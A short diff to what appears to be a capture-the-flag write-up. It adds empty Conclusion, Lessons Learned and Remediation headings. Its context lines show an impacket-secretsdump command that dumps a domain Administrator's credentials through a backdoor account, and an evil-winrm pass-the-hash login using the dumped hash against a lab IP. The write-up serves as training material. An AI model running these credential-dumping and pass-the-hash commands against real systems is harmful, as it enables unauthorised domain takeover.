@@ -137,4 +137,8 @@ impacket-secretsdump -just-dc-user Administrator htb/Backdoor:"Password1"@10.129
 ```
 evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
+## Conclusion
 
+## Lessons Learned
+
+## Remediation
